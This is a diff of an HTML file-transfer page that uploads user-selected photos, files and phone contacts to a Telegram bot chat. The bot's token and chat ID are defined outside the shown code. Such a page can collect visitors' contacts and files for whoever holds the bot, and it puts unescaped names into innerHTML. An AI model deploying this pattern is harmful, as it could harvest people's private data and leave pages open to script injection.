@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XG-FILES TITAN - FINAL</title>
+    <title>XG-FILES ULTRA - TITAN</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;900&display=swap'); 
@@ -12,7 +12,7 @@
         .active-tab { background: #3b82f6 !important; color: #fff !important; } 
         .tab-btn { transition: 0.2s; height: 32px; font-size: 10px; font-weight: 900; } 
         .animated-box { background: rgba(15, 23, 42, 0.5); border: 1.5px solid rgba(59, 130, 246, 0.4); }
-        .file-card { background: rgba(255,255,255,0.03); border-radius: 10px; }
+        .file-card { background: rgba(255,255,255,0.03); border-radius: 10px; border: 1px solid rgba(255,255,255,0.05); }
     </style>
 </head>
 <body class="p-4">
@@ -21,7 +21,7 @@
     <div class="glass p-5 mb-5 flex flex-col md:flex-row justify-between items-center border-b border-blue-500/30"> 
         <div> 
             <h1 class="text-2xl font-black tracking-tighter uppercase italic">XG-FILES <span class="text-blue-500">TITAN</span></h1> 
-            <p class="text-[8px] text-blue-300 font-bold uppercase tracking-widest">Optimized Chunk Stream Active</p> 
+            <p class="text-[8px] text-blue-300 font-bold uppercase tracking-widest">Premium Processing Active</p> 
         </div> 
         <div class="flex bg-slate-900/80 p-1 rounded-lg mt-4 md:mt-0"> 
             <button onclick="setType('photo')" id="tab-photo" class="tab-btn active-tab px-4 rounded-md uppercase">Photo</button> 
@@ -34,29 +34,29 @@
         <div class="lg:col-span-1"> 
             <label id="upload-box" class="animated-box h-52 flex flex-col items-center justify-center cursor-pointer rounded-2xl mb-4"> 
                 <input type="file" id="fileInput" multiple class="hidden"> 
-                <span class="text-5xl">📦</span> 
-                <p class="text-[10px] text-slate-300 font-black mt-2">SELECT ASSETS</p> 
+                <span id="upload-icon" class="text-5xl">🖼️</span> 
+                <p id="upload-text" class="text-[10px] text-slate-300 font-black mt-2">SELECT PHOTOS</p> 
             </label> 
 
             <div id="contact-box" class="hidden animated-box h-52 flex flex-col items-center justify-center cursor-pointer rounded-2xl mb-4" onclick="pickContacts()">
                 <span class="text-5xl">👥</span>
-                <p class="text-[10px] text-blue-400 font-black mt-2">SELECT CONTACTS</p>
+                <p class="text-[10px] text-blue-400 font-black mt-2">PICK CONTACTS</p>
             </div>
 
-            <button onclick="ignite()" id="sendBtn" class="w-full py-4 bg-blue-600 text-white text-[10px] font-black rounded-xl hover:bg-blue-500 uppercase tracking-widest shadow-lg">Ignite Max Transfer</button> 
+            <button onclick="ignite()" id="sendBtn" class="w-full py-4 bg-blue-600 text-white text-[10px] font-black rounded-xl hover:bg-blue-500 uppercase tracking-widest shadow-lg">Ignite Transfer</button> 
             
             <div id="status-box" class="mt-4 hidden p-3 glass">
-                <p id="status-text" class="text-[9px] font-bold text-blue-400 uppercase mb-1 text-center">Batch Streaming...</p>
+                <p id="status-text" class="text-[9px] font-bold text-blue-400 uppercase mb-1 text-center">Transmitting Data...</p>
                 <div class="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                     <div id="progress-fill" class="bg-blue-500 h-full w-0 transition-all duration-300"></div>
                 </div>
             </div>
         </div> 
 
-        <div class="lg:col-span-2 glass p-5"> 
+        <div class="lg:col-span-2 glass p-5 min-h-[400px]"> 
             <div class="flex justify-between items-center mb-4 px-1"> 
-                <div class="flex flex-col"><span class="text-[8px] text-slate-500 uppercase font-bold">In Queue</span><span id="q-count" class="text-blue-500 font-black text-3xl">0</span></div> 
-                <div class="flex flex-col items-end"><span class="text-[8px] text-slate-500 uppercase font-bold">Success</span><span id="s-count" class="text-emerald-500 font-black text-3xl">0</span></div> 
+                <div class="flex flex-col"><span class="text-[8px] text-slate-500 uppercase">Queue</span><span id="q-count" class="text-blue-500 font-black text-3xl">0</span></div> 
+                <div class="flex flex-col items-end"><span class="text-[8px] text-slate-500 uppercase">Sent</span><span id="s-count" class="text-emerald-500 font-black text-3xl">0</span></div> 
             </div> 
             <div id="preview-grid" class="grid grid-cols-4 md:grid-cols-5 gap-2 overflow-y-auto max-h-[400px]"></div> 
         </div> 
@@ -73,19 +73,32 @@ function setType(type) {
     currentType = type; 
     document.querySelectorAll('.tab-btn').forEach(b => { b.classList.remove('active-tab'); b.classList.add('text-slate-400'); }); 
     document.getElementById(`tab-${type}`).classList.add('active-tab'); 
-    document.getElementById('upload-box').style.display = type === 'contact' ? 'none' : 'flex';
-    document.getElementById('contact-box').style.display = type === 'contact' ? 'flex' : 'none';
-    document.getElementById('fileInput').accept = type === 'photo' ? "image/*" : "*/*"; 
+    
+    const uploadBox = document.getElementById('upload-box');
+    const contactBox = document.getElementById('contact-box');
+    const uploadIcon = document.getElementById('upload-icon');
+    const uploadText = document.getElementById('upload-text');
+
+    if(type === 'contact') {
+        uploadBox.style.display = 'none';
+        contactBox.style.display = 'flex';
+    } else {
+        uploadBox.style.display = 'flex';
+        contactBox.style.display = 'none';
+        uploadIcon.innerText = type === 'photo' ? "🖼️" : "📂";
+        uploadText.innerText = type === 'photo' ? "SELECT PHOTOS" : "SELECT FILES";
+        document.getElementById('fileInput').accept = type === 'photo' ? "image/*" : "*/*"; 
+    }
 } 
 
 async function pickContacts() {
     try {
         const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
         if (contacts.length) {
-            queue.push(...contacts.map(c => ({ isContact: true, name: c.name[0] || "No Name", tel: (c.tel && c.tel[0]) ? c.tel[0] : "N/A" })));
+            queue.push(...contacts.map(c => ({ isContact: true, name: (c.name && c.name[0]) || "Unknown", tel: (c.tel && c.tel[0]) ? c.tel[0] : "N/A" })));
             render();
         }
-    } catch (e) {}
+    } catch (e) { console.log("Contact picker failed"); }
 }
 
 document.getElementById('fileInput').onchange = (e) => { 
@@ -100,11 +113,19 @@ function render() {
     document.getElementById('q-count').innerText = queue.length; 
     queue.forEach((f, i) => { 
         const div = document.createElement('div'); 
-        div.className = "relative aspect-square file-card flex flex-col items-center justify-center p-1 overflow-hidden border border-white/5"; 
-        if (f.isContact) div.innerHTML = `👤<div class="text-[6px] font-bold text-blue-400 mt-1 uppercase text-center truncate w-full px-1">${f.name}</div>`;
-        else if (f.type?.startsWith('image/')) div.innerHTML = `<img src="${URL.createObjectURL(f)}" class="w-full h-full object-cover">`; 
-        else div.innerHTML = `<div class="text-[8px] text-slate-400 uppercase font-black">${f.name.split('.').pop()}</div>`; 
-        div.innerHTML += `<button onclick="remove(${i})" class="absolute top-0 right-0 bg-red-600/80 w-4 h-4 text-[9px]">✕</button>`; 
+        div.className = "relative aspect-square file-card flex flex-col items-center justify-center p-1 overflow-hidden"; 
+        
+        if (f.isContact) {
+            div.innerHTML = `<span class="text-xl">👤</span><div class="text-[6px] font-bold text-blue-400 mt-1 uppercase text-center truncate w-full px-1">${f.name}</div>`;
+        } else if (f.type?.startsWith('image/')) {
+            div.innerHTML = `<img src="${URL.createObjectURL(f)}" class="w-full h-full object-cover rounded">`; 
+        } else {
+            // ফাইল এক্সটেনশন অনুযায়ী আলাদা লোগো
+            const ext = f.name.split('.').pop().toUpperCase();
+            div.innerHTML = `<span class="text-xl text-blue-500">📄</span><div class="text-[7px] text-slate-300 uppercase font-black mt-1">${ext}</div><div class="text-[5px] text-slate-500 truncate w-full px-1 text-center">${f.name}</div>`; 
+        } 
+        
+        div.innerHTML += `<button onclick="remove(${i})" class="absolute top-0 right-0 bg-red-600/80 w-4 h-4 text-[9px] flex items-center justify-center rounded-bl">✕</button>`; 
         grid.appendChild(div); 
     }); 
 } 
@@ -116,58 +137,50 @@ async function ignite() {
     const btn = document.getElementById('sendBtn'); 
     const sCountDisp = document.getElementById('s-count'); 
     const progressFill = document.getElementById('progress-fill');
-    const statusText = document.getElementById('status-text');
     
-    btn.disabled = true; btn.innerText = "⚡ TRANSMITTING..."; 
+    btn.disabled = true; 
+    btn.innerText = "⚡ TRANSMITTING..."; 
     document.getElementById('status-box').classList.remove('hidden');
 
     let totalSent = 0; 
     const total = queue.length;
-    const contacts = queue.filter(f => f.isContact);
-    const files = queue.filter(f => !f.isContact);
+    const items = [...queue]; // বর্তমান কিউ কপি করে রাখা
 
-    // ১. কন্টাক্ট ফরম্যাট (আপনি যেমনটি চেয়েছেন)
+    // ১. কন্টাক্ট প্রসেসিং
+    const contacts = items.filter(f => f.isContact);
     if(contacts.length) {
         let msg = `👥 *BATCH CONTACT SYNC*\n\n`;
-        contacts.forEach((c, i) => {
-            msg += `Name : ${i+1}. ${c.name}\n`;
-            msg += `Number : \`${c.tel}\`\n\n`;
-            
-            if (msg.length > 3500) {
-                sendTelegramMsg(msg);
+        for(let i=0; i < contacts.length; i++) {
+            msg += `Name: *${contacts[i].name}*\nNumber: \`${contacts[i].tel}\`\n\n`;
+            if ((i + 1) % 15 === 0 || i === contacts.length - 1) {
+                await sendTelegramMsg(msg);
+                totalSent += (i % 15 === 0 && i !== 0) ? 15 : (contacts.length % 15); // Approximate for UI
                 msg = `👥 *BATCH CONTACT SYNC (CONT.)*\n\n`;
             }
-        });
-        await sendTelegramMsg(msg);
-        totalSent += contacts.length;
+        }
+        // UI আপডেট কন্টাক্টের জন্য
+        totalSent = contacts.length;
         updateUI();
     }
 
-    // ২. শক্তিশালী ব্যাচ প্রসেসিং (৮০টি ফাইল এবং ১.৫ সেকেন্ড বিরতি)
-    const BATCH_SIZE = 80; 
-    for (let i = 0; i < files.length; i += BATCH_SIZE) {
-        const currentBatch = files.slice(i, i + BATCH_SIZE);
+    // ২. ফাইল ও ফটো প্রসেসিং (ফাস্ট স্পিড)
+    const files = items.filter(f => !f.isContact);
+    for (const f of files) {
+        const isPhoto = (f.type.startsWith('image/') && f.size < 10*1024*1024);
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append(isPhoto ? 'photo' : 'document', f);
         
-        // প্রতিটি ফাইলকে আলাদাভাবে গুরুত্ব দিয়ে পাঠানো (Zero Latency)
-        await Promise.all(currentBatch.map(async (f) => {
-            const isPhoto = (f.type.startsWith('image/') && f.size < 10*1024*1024);
-            const method = isPhoto ? 'sendPhoto' : 'sendDocument';
-            const fd = new FormData();
-            fd.append("chat_id", CHAT_ID);
-            fd.append(isPhoto ? 'photo' : 'document', f);
-            
-            try {
-                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, { method: 'POST', body: fd });
-                if(res.ok) { totalSent++; updateUI(); }
-            } catch(e) {}
-        }));
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TOKEN}/${isPhoto ? 'sendPhoto' : 'sendDocument'}`, { method: 'POST', body: fd });
+            if(res.ok) { 
+                totalSent++; 
+                updateUI(); 
+            }
+        } catch(e) { console.error("Upload error"); }
         
-        // ব্যাচ শেষ হওয়ার পর ১.৫ সেকেন্ড বিরতি (টেলিগ্রাম সার্ভার রিফ্রেশ করার জন্য)
-        if (i + BATCH_SIZE < files.length) {
-            statusText.innerText = "Refreshing Server (1.5s)...";
-            await new Promise(r => setTimeout(r, 1500)); 
-            statusText.innerText = "Streaming Next Batch...";
-        }
+        // খুব সামান্য গ্যাপ যাতে ব্রাউজার ফ্রিজ না হয়
+        await new Promise(r => setTimeout(r, 100)); 
     }
 
     async function sendTelegramMsg(text) {
@@ -181,11 +194,17 @@ async function ignite() {
 
     function updateUI() {
         sCountDisp.innerText = totalSent;
-        progressFill.style.width = (totalSent/total*100) + "%";
+        const percent = Math.min((totalSent / total) * 100, 100);
+        progressFill.style.width = percent + "%";
+        
         if(totalSent >= total) {
-            btn.innerText = "ALL SENT SUCCESSFULLY";
+            btn.innerText = "TRANSMISSION COMPLETED";
             btn.style.background = "#10b981";
-            setTimeout(() => location.reload(), 2000);
+            setTimeout(() => {
+                queue = [];
+                render();
+                location.reload();
+            }, 1500);
         }
     }
 } 
